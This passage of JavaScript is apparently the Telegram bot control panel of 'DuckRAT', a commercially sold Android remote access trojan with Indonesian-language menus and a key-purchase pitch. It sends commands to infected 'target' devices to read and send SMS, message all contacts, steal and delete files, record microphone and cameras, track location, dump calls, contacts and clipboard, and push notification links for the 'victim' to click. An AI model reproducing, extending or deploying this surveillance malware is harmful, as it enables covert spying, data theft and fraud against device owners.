                "°• 𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙝𝙚 𝙣𝙪𝙢𝙗𝙚𝙧 𝙩𝙤 𝙬𝙝𝙞𝙘𝙝 𝙮𝙤𝙪 𝙬𝙖𝚗𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙝𝙚 𝙎𝙈𝙎",
            )
        ) {
            currentNumber = message.text;
            appBot.sendMessage(
                id,
                "°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙩𝙝𝙞𝙨 𝙣𝙪𝙢𝙗𝙚𝙧\n\n" +
                    "• ʙᴇ ᴄᴀʀᴇꜰᴜʟ ᴛʜᴀᴛ ᴛʜᴇ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ꜱᴇɴᴛ ɪꜰ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴏꜰ ᴄʜᴀʀᴀᴄᴛᴇʀꜱ ɪɴ ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ɪꜱ ᴍᴏʀᴇ ᴛʜᴀɴ ᴀʟʟᴏᴡᴇᴅ",
                { reply_markup: { force_reply: true } },
            );
        }
        if (
            message.reply_to_message.text.includes(
                "°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙩𝙝𝙞𝙨 𝙣𝙪𝙢𝙗𝙚𝙧",
            )
        ) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message:${currentNumber}/${message.text}`);
                }
            });
            currentNumber = "";
            currentUuid = "";
            appBot.sendMessage(
                id,
                "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n" +
                    "• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ",
            );
        }
        if (
            message.reply_to_message.text.includes(
                "°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨",
            )
        ) {
            const message_to_all = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message_to_all:${message_to_all}`);
                }
            });
            currentUuid = "";
            appBot.sendMessage(
                id,
                "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n" +
                    "• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ",
            );
        }

        if (
            message.reply_to_message.text.includes(
                "°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙",
            )
        ) {
            const message_to_all = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`open_target_link:${message_to_all}`);
                }
            });
            currentUuid = "";
            appBot.sendMessage(
                id,
                "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n" +
                    "• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ",
            );
        }
        if (
            message.reply_to_message.text.includes("°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙏𝙚𝙭𝙩 𝙩𝙤 𝙎𝙥𝙚𝙖𝙠")
        ) {
            const message_to_tts = message.text;
            const message_tts_link =
                "https://translate.google.com/translate_tts?ie=UTF-8&tl=en&tk=995126.592330&client=t&q=" +
                encodeURIComponent(message_to_tts);
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`text_to_speech:${message_tts_link}`);
                }
            });
            currentUuid = "";
            appBot.sendMessage(
                id,
                "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n" +
                    "• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ",
            );
        }

        if (
            message.reply_to_message.text.includes(
                "°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙤𝙬𝙣𝙡𝙤𝙖𝙙",
            )
        ) {
            const path = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`file:${path}`);
                }
            });
            currentUuid = "";
            appBot.sendMessage(
                id,
                "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n" +
                    "• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ",
            );
        }
        if (
            message.reply_to_message.text.includes(
                "°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙚𝙡𝙚𝙩𝙚",
            )
        ) {
            const path = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`delete_file:${path}`);
                }
            });
            currentUuid = "";
            appBot.sendMessage(
                id,
                "°• 𝙔𝙤𝙪𝙧 𝙧𝙚 ���𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n" +
                    "• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ",
            );
        }
        if (
            message.reply_to_message.text.includes(
                "°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙",
            )
        ) {
            const duration = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`microphone:${duration}`);
                }
            });
            currentUuid = "";
            appBot.sendMessage(
                id,
                "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n" +
                    "• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ",
            );
        }
        if (
            message.reply_to_message.text.includes(
                "°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙖𝙞𝙣 𝙘𝙖𝙢𝙚𝙧𝙖 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙",
            )
        ) {
            const duration = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_main:${duration}`);
                }
            });
            currentUuid = "";
            appBot.sendMessage(
                id,
                "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n" +
                    "• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ",
            );
        }
        if (
            message.reply_to_message.text.includes(
                "°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙨𝙚𝙡𝙛𝙞𝙚 𝙘𝙖𝙢𝙚𝙧𝙖 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙",
            )
        ) {
            const duration = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_selfie:${duration}`);
                }
            });
            currentUuid = "";
            appBot.sendMessage(
                id,
                "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n" +
                    "• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ",
            );
        }
        if (
            message.reply_to_message.text.includes(
                "°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙝𝙖𝙩 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙤𝙣 𝙩𝙝𝙚 𝙩𝙖𝙧𝙜𝙚𝙩 𝙙𝙚𝙫𝙞𝙘𝙚",
            )
        ) {
            const toastMessage = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`toast:${toastMessage}`);
                }
            });
            currentUuid = "";
            appBot.sendMessage(
                id,
                "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n" +
                    "• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ",
            );
        }
        if (
            message.reply_to_message.text.includes(
                "°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙖𝙨 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣",
            )
        ) {
            const notificationMessage = message.text;
            currentTitle = notificationMessage;
            appBot.sendMessage(
                id,
                "°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙗𝙚 𝙤𝙥𝙚𝙣𝙚𝙙 𝙗𝙮 𝙩𝙝𝙚 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣\n\n" +
                    "• ᴡʜᴇɴ ᴛʜᴇ ᴠɪᴄᴛɪᴍ ᴄʟɪᴄᴋꜱ ᴏɴ ᴛʜᴇ ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ, ᴛʜᴇ ʟɪɴᴋ ʏᴏᴜ ᴀʀᴇ ᴇɴᴛᴇʀɪɴɢ ᴡɪʟʟ ʙᴇ ᴏᴘᴇɴᴇᴅ",
                { reply_markup: { force_reply: true } },
            );
        }
        if (
            message.reply_to_message.text.includes(
                "°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙗𝙚 𝙤𝙥𝗲𝗻𝗲𝗱 𝗯𝘆 𝘁𝗵𝗲 𝗻𝗼𝘁𝗶𝗳𝗶𝗰𝗮𝘁𝗶𝗼𝗻",
            )
        ) {
            const link = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`show_notification:${currentTitle}/${link}`);
                }
            });
            currentUuid = "";
            appBot.sendMessage(
                id,
                "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n" +
                    "• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ",
            );
        }
        if (
            message.reply_to_message.text.includes(
                "°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙖𝙪𝙙𝙞𝙤 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙥𝙡𝙖𝙮",
            )
        ) {
            const audioLink = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`play_audio:${audioLink}`);
                }
            });
            currentUuid = "";
            appBot.sendMessage(
                id,
                "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n" +
                    "• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ",
            );
        }
    } catch (error) {
        console.error("Error handling reply message:", error);
    }
}

// Handle direct messages
function handleDirectMessage(message) {
    try {
        const chatId = message.chat.id;

        // Handle authentication command
        if (message.text.startsWith("/auth ")) {
            const inputKey = message.text.split(" ")[1];

            if (!inputKey) {
                appBot.sendMessage(
                    id,
                    "❌ <b>Format salah!</b>\n\n" +
                        "• Gunakan: <code>/auth YOUR_KEY</code>\n" +
                        "• Contoh: <code>/auth DUCKRAT-2024-PREMIUM-001</code>\n\n" +
                        "💰 Belum punya key? Hubungi @izal_buyx",
                    { parse_mode: "HTML" },
                );
                return;
            }

            if (VALID_KEYS.includes(inputKey)) {
                telegramAuthenticatedUsers.set(chatId, {
                    key: inputKey,
                    authenticatedAt: Date.now(),
                    username: message.from.username || "Unknown",
                });

                appBot.sendMessage(
                    id,
                    "✅ <b>Authentication Successful!</b>\n\n" +
                        `• Key: <code>${inputKey}</code>\n` +
                        `• User: @${message.from.username || "Unknown"}\n` +
                        `• Time: ${new Date().toLocaleString()}\n\n` +
                        "🎉 Selamat datang di DuckRAT Panel Premium!\n" +
                        "Gunakan /start untuk mulai menggunakan bot.",
                    { parse_mode: "HTML" },
                );

                // Log successful authentication
                console.log(
                    `Telegram authentication successful: ${message.from.username} with key: ${inputKey}`,
                );
                return;
            } else {
                appBot.sendMessage(
                    id,
                    "❌ <b>Key tidak valid!</b>\n\n" +
                        "• Key yang Anda masukkan tidak terdaftar\n" +
                        "• Pastikan key yang dimasukkan benar\n\n" +
                        "💰 <b>Ingin membeli key akses?</b>\n" +
                        "• Hubungi: @izal_buyx\n" +
                        "• Dapatkan key premium dengan fitur lengkap\n" +
                        "• Harga terjangkau dengan kualitas terbaik\n\n" +
                        "🔥 <b>Keuntungan Key Premium:</b>\n" +
                        "• Akses tanpa batas\n" +
                        "• Fitur advanced\n" +
                        "• Support prioritas\n" +
                        "• Update gratis selamanya",
                    { parse_mode: "HTML" },
                );

                // Log failed authentication attempt
                console.log(
                    `Failed Telegram authentication: ${message.from.username} with invalid key: ${inputKey}`,
                );
                return;
            }
        }

        if (message.text == "/start") {
            const userAuth = telegramAuthenticatedUsers.get(chatId);

            if (!userAuth) {
                appBot.sendMessage(
                    id,
                    "🔐 <b>DuckRAT Panel - Authentication Required</b>\n\n" +
                        "• Selamat datang di DuckRAT Panel Premium\n" +
                        "• Untuk menggunakan bot ini, Anda memerlukan key akses\n\n" +
                        "🔑 <b>Cara Login:</b>\n" +
                        "• Gunakan: <code>/auth YOUR_KEY</code>\n" +
                        "• Contoh: <code>/auth DUCKRAT-2024-PREMIUM-001</code>\n\n" +
                        "💰 <b>Belum punya key akses?</b>\n" +
                        "• Contact: @izal_buyx\n" +
                        "• Dapatkan key premium dengan harga terjangkau\n" +
                        "• Fitur lengkap + support 24/7\n\n" +
                        "⚡ <b>Fitur Premium Key:</b>\n" +
                        "• Remote Access Android unlimited\n" +
                        "• File manager & Screenshot real-time\n" +
                        "• Camera & Microphone access\n" +
                        "• SMS & Contact management\n" +
                        "• Location tracking\n" +
                        "• Advanced surveillance features\n\n" +
                        "📞 Buy Key: @izal_buyx\n" +
                        "🌐 GitHub: https://github.com/DuskCipher/duckrat",
                    {
                        parse_mode: "HTML",
                        disable_web_page_preview: true,
                    },
                );
                return;
            }

            appBot.sendMessage(
                id,
                `• 𝖲𝖾𝗅𝖺𝗆𝖺𝗍 𝖣𝖺𝗍𝖺𝗇𝗀 𝖽𝗂 𝖯𝖺𝗇𝖾𝗅 𝖱𝖠𝖳\n\n` +
                    `🔐 <b>Status:</b> Authenticated ✅\n` +
                    `🔑 <b>Key:</b> ${userAuth.key}\n` +
                    `👤 <b>User:</b> @${userAuth.username}\n\n` +
                    "• Jika aplikasi telah terpasang di perangkat target, tunggu hingga perangkat terhubung.\n\n" +
                    "• Ketika kamu menerima pesan koneksi, itu berarti perangkat target sudah terhubung dan siap menerima perintah.\n\n" +
                    "• Klik tombol perintah, pilih perangkat yang diinginkan, lalu pilih perintah yang ingin dijalankan dari daftar.\n\n" +
                    "• Jika kamu mengalami kendala saat menggunakan bot, kirim perintah /start untuk mengulang.\n\n" +
                    "• ᴅᴇᴠᴇʟᴏᴘᴇᴅ ʙʏ : @izal_buyx & https://github.com/DuskCipher/duckrat",
                {
                    parse_mode: "HTML",
                    disable_web_page_preview: true,
                    reply_markup: {
                        keyboard: [
                            ["𝗖𝗼𝗻𝗻𝗲𝗰𝘁𝗲𝗱 𝗗𝗲𝘃𝗶𝗰𝗲𝘀"],
                            ["𝗠𝗲𝗻𝘂 𝗗𝘂𝗰𝗸𝗥𝗔𝗧"],
                            ["📋 𝗧𝗲𝗻𝘁𝗮𝗻𝗴 𝗞𝗮𝗺𝗶"],
                            ["🔐 𝗟𝗼𝗴𝗼𝘂𝘁"],
                        ],
                        resize_keyboard: true,
                    },
                },
            );
        }
        if (message.text == "🔐 𝗟𝗼𝗴𝗼𝘂𝘁") {
            telegramAuthenticatedUsers.delete(chatId);
            appBot.sendMessage(
                id,
                "🔓 <b>Logout Successful</b>\n\n" +
                    "• Anda telah keluar dari DuckRAT Panel\n" +
                    "• Gunakan /start untuk login kembali\n\n" +
                    "💰 Ingin membeli key baru? Hubungi @izal_buyx",
                {
                    parse_mode: "HTML",
                    reply_markup: {
                        remove_keyboard: true,
                    },
                },
            );
            return;
        }

        if (message.text == "𝗖𝗼𝗻𝗻𝗲𝗰𝘁𝗲𝗱 𝗗𝗲𝘃𝗶𝗰𝗲𝘀") {
            if (appClients.size == 0) {
                appBot.sendMessage(
                    id,
                    "• 𝗡𝗼 𝗖𝗼𝗻𝗻𝗲𝗰𝘁𝗶𝗻𝗴 𝗗𝗲𝘃𝗶𝗰𝗲𝘀\n\n" +
                        "• ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ",
                );
            } else {
                let text = "• 𝗟𝗶𝘀𝘁 𝗼𝗳 𝗖𝗼𝗻𝗻𝗲𝗰𝘁𝗲𝗱 𝗗𝗲𝘃𝗶𝗰𝗲𝘀 :\n\n";
                appClients.forEach(function (value, key, map) {
                    text +=
                        `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${value.model}</b>\n` +
                        `• ʙᴀᴛᴛᴇʀʏ : <b>${value.battery}</b>\n` +
                        `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${value.version}</b>\n` +
                        `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${value.brightness}</b>\n` +
                        `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${value.provider}</b>\n\n`;
                });
                appBot.sendMessage(id, text, { parse_mode: "HTML" });
            }
        }
        if (message.text == "𝗠𝗲𝗻𝘂 𝗗𝘂𝗰𝗸𝗥𝗔𝗧") {
            if (appClients.size == 0) {
                appBot.sendMessage(
                    id,
                    "°• 𝙉𝙤 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙞𝙣𝙜 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 𝙖𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚\n\n" +
                        "• ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ",
                );
            } else {
                const deviceListKeyboard = [];
                appClients.forEach(function (value, key, map) {
                    deviceListKeyboard.push([
                        {
                            text: value.model,
                            callback_data: "device:" + key,
                        },
                    ]);
                });
                appBot.sendMessage(id, "• 𝗦𝗲𝗹𝗲𝗰𝘁 𝗱𝗲𝘃𝗶𝗰𝗲 𝘁𝗼 𝗗𝘂𝗰𝗸𝗥𝗔𝗧", {
                    reply_markup: {
                        inline_keyboard: deviceListKeyboard,
                    },
                });
            }
        }
        if (message.text == "📋 𝗧𝗲𝗻𝘁𝗮𝗻𝗴 𝗞𝗮𝗺𝗶") {
            appBot.sendMessage(
                id,
                "• 𝗔𝗽𝗮 𝗶𝘁𝘂 𝗗𝘂𝗰𝗸𝗥𝗔𝗧?\n\n" +
                    "DuckRAT adalah tools remote access yang memungkinkan Anda mengendalikan perangkat Android dari jarak jauh melalui panel web dan Telegram Bot.\n\n" +
                    "• 𝗙𝗶𝘁𝘂𝗿 𝘂𝘁𝗮𝗺𝗮:\n" +
                    "- Akses file, kamera, mikrofon, SMS, kontak, clipboard, lokasi, notifikasi, dan lainnya.\n\n" +
                    "• 𝗗𝗶𝗸𝗲𝗺𝗯𝗮𝗻𝗴𝗸𝗮𝗻 𝗼𝗹𝗲𝗵:\n" +
                    "@izal_buyx & DuskCipher Team\n\n" +
                    "• 𝗗𝗶𝘀𝗰𝗹𝗮𝗶𝗺𝗲𝗿:\n" +
                    "Tools ini dibuat untuk tujuan edukasi dan testing. Gunakan dengan bijak dan sesuai hukum yang berlaku.",
                {
                    parse_mode: "HTML",
                    disable_web_page_preview: true,
                    reply_markup: {
                        keyboard: [
                            ["𝗖𝗼𝗻𝗻𝗲𝗰𝘁𝗲𝗱 𝗗𝗲𝘃𝗶𝗰𝗲𝘀"],
                            ["𝗠𝗲𝗻𝘂 𝗗𝘂𝗰𝗸𝗥𝗔𝗧"],
                            ["📋 𝗧𝗲𝗻𝘁𝗮𝗻𝗴 𝗞𝗮𝗺𝗶"],
                        ],
                        resize_keyboard: true,
                    },
                },
            );
        }
    } catch (error) {
        console.error("Error handling direct message:", error);
    }
}

// Telegram bot callback query handling (keeping existing implementation)
appBot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data;
    const commend = data.split(":")[0];
    const uuid = data.split(":")[1];
    console.log(uuid);
    if (commend == "device") {
        appBot.editMessageText(
            `• 𝗦𝗲𝗹𝗲𝗰𝘁 𝗺𝗲𝗻𝘂 𝗗𝘂𝗰𝗸𝗥𝗔𝗧 <b>${appClients.get(data.split(":")[1]).model}</b>`,
            {
                width: 10000,
                chat_id: id,
                message_id: msg.message_id,
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: "𝘼𝙥𝙥𝙨", callback_data: `apps:${uuid}` },
                            {
                                text: "𝘿𝙚𝙫𝙞𝙘𝙚 𝙞𝙣𝙛𝙤",
                                callback_data: `device_info:${uuid}`,
                            },
                        ],
                        [
                            { text: "𝙂𝙚𝙩 𝙛𝙞𝙡𝙚", callback_data: `file:${uuid}` },
                            {
                                text: "𝘿𝙚𝙡𝙚𝙩𝙚 𝙛𝙞𝙡𝙚",
                                callback_data: `delete_file:${uuid}`,
                            },
                        ],
                        [
                            {
                                text: "𝘾𝙡𝙞𝙥𝙗𝙤𝙖𝙧𝙙",
                                callback_data: `clipboard:${uuid}`,
                            },
                            {
                                text: "𝙈𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚",
                                callback_data: `microphone:${uuid}`,
                            },
                        ],
                        [
                            {
                                text: "𝙈𝙖𝙞𝙣 𝙘𝙖𝙢𝙚𝙧𝙖",
                                callback_data: `camera_main:${uuid}`,
                            },
                            {
                                text: "𝙎𝙚𝙡𝙛𝙞𝙚 𝙘𝙖𝙢𝙚𝙧𝙖",
                                callback_data: `camera_selfie:${uuid}`,
                            },
                        ],
                        [
                            {
                                text: "𝙍𝙚𝙘𝙤𝙧𝙙 𝙈𝙖𝙞𝙣 𝙘𝙖𝙢𝙚𝙧𝙖",
                                callback_data: `rec_camera_main:${uuid}`,
                            },
                            {
                                text: "𝙍𝙚𝙘𝙤𝙧𝙙 𝙎𝙚𝙡𝙛𝙞𝙚 𝙘𝙖𝙢𝙚𝙧𝙖",
                                callback_data: `rec_camera_selfie:${uuid}`,
                            },
                        ],
                        [
                            {
                                text: "𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣",
                                callback_data: `location:${uuid}`,
                            },
                            { text: "𝙏𝙤𝙖𝙨𝙩", callback_data: `toast:${uuid}` },
                        ],
                        [
                            { text: "𝘾𝙖𝙡𝙡𝙨", callback_data: `calls:${uuid}` },
                            {
                                text: "𝘾𝙤𝙣𝙩𝙖𝙘𝙩𝙨",
                                callback_data: `contacts:${uuid}`,
                            },
                        ],
                        [
                            {
                                text: "𝙑𝙞𝙗𝙧𝙖𝙩𝙚",
                                callback_data: `vibrate:${uuid}`,
                            },
                            {
                                text: "𝙎𝙝𝙤𝙬 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣",
                                callback_data: `show_notification:${uuid}`,
                            },
                        ],
                        [
                            {
                                text: "𝙈𝙚𝙨𝙨𝙖𝙜𝙚𝙨",
                                callback_data: `messages:${uuid}`,
                            },
                            {
                                text: "𝙎𝙚𝙣𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚",
                                callback_data: `send_message:${uuid}`,
                            },
                        ],
                        [
                            {
                                text: "𝙋𝙡𝙖𝙮 𝙖𝙪𝙙𝙞𝙤",
                                callback_data: `play_audio:${uuid}`,
                            },
                            {
                                text: "𝙎𝙩𝙤𝙥 𝙖𝙪𝙙𝙞𝙤",
